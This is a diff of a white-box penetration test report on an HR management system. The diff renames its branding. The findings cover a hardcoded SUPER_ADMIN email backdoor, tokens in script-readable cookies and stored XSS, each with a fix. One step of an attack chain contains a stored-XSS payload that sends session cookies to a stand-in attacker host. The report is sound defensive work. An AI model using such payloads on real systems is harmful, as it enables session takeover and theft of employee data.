@@ -1,6 +1,6 @@
 # Vulnerability Assessment & Penetration Test Report
 
-**Target:** Vorkhive HRMS (NEWHRMS)
+**Target:** GaDongHR HRMS (NEWHRMS)
 **Date:** 2026-05-28
 **Scope:** 21 Node.js microservices + Next.js frontend + Python face-service
 **Tester role:** Security engineer (white-box review)
@@ -57,7 +57,7 @@ The findings cluster into four root causes:
 
 ### C-04 — Hardcoded SUPER_ADMIN email backdoor in `/auth/me`
 - **File:** `services/auth-service/src/routes/auth.routes.js:306-310`
-- **Code:** `if (user.email === 'admin@vorkhive.sg' || user.email === 'admin@hrms.com') { roleName = 'SUPER_ADMIN'; }`
+- **Code:** `if (user.email === 'admin@gadonghr.sg' || user.email === 'admin@hrms.com') { roleName = 'SUPER_ADMIN'; }`
 - **Exploit:** Any user with one of those email addresses is silently treated as SUPER_ADMIN by `/auth/me`, regardless of the DB-assigned role.
 - **Impact:** A user demoted by HR remains effectively SUPER_ADMIN. Anyone able to provision an account with these emails (seed scripts, invite flow) becomes SUPER_ADMIN.
 - **Fix:** Delete the override entirely.
@@ -103,9 +103,9 @@ The findings cluster into four root causes:
 - **Fix:** Explicit origin allowlist, remove `x-user-id`/`x-user-role`/`x-employee-id` from `allowedHeaders`. Downstream services must read identity from the verified JWT in their own `authenticate`, not from headers.
 
 ### C-12 — JWTs in JavaScript-readable cookies
-- **Files:** `frontend/src/lib/api.ts:13-27` (write via `document.cookie`), ~15 sites read `document.cookie.split('vorkhive_token=')…`
+- **Files:** `frontend/src/lib/api.ts:13-27` (write via `document.cookie`), ~15 sites read `document.cookie.split('gadonghr_token=')…`
 - **Impact:** Any successful XSS (C-13, C-14, C-15) exfiltrates the 8h access token AND the 7d refresh token in one fetch. Refresh token grants persistent access.
-- **Fix:** Backend sets `Set-Cookie: vorkhive_token=…; HttpOnly; Secure; SameSite=Strict`; remove all `document.cookie` reads; frontend uses `credentials: 'include'`. Add CSRF token once HttpOnly+SameSite=Strict is in place.
+- **Fix:** Backend sets `Set-Cookie: gadonghr_token=…; HttpOnly; Secure; SameSite=Strict`; remove all `document.cookie` reads; frontend uses `credentials: 'include'`. Add CSRF token once HttpOnly+SameSite=Strict is in place.
 
 ### C-13 — Stored XSS via e-sign `personalizedHtml`
 - **Files:** `services/esign-service/src/engines/esign.engine.js:16-22` (`fillTemplate` raw `.replace`, no escape); sink at `frontend/src/app/(dashboard)/documents/sign/[id]/page.tsx:269` (`dangerouslySetInnerHTML`).
@@ -317,7 +317,7 @@ These are the chains a penetration tester would write up as the "headline" attac
 1. POST `/api/loans/staff-loans` (or `/advances`) with `{ employeeName: 'Alice<script>fetch("//atk.tld/?c="+document.cookie)</script>', reason: '...', ... }` (C-14).
 2. Loan agreement is auto-generated and stored.
 3. FINANCE_ADMIN opens the loan-approval modal. The agreement HTML preview executes the payload in the FINANCE_ADMIN's session.
-4. JS reads `document.cookie` (C-12), exfiltrates both `vorkhive_token` and `vorkhive_refresh` to attacker.
+4. JS reads `document.cookie` (C-12), exfiltrates both `gadonghr_token` and `gadonghr_refresh` to attacker.
 5. Attacker now has 7-day FINANCE_ADMIN refresh-token access.
 
 **Time to exploit:** as long as it takes the approver to click. **Output:** FINANCE_ADMIN session takeover.
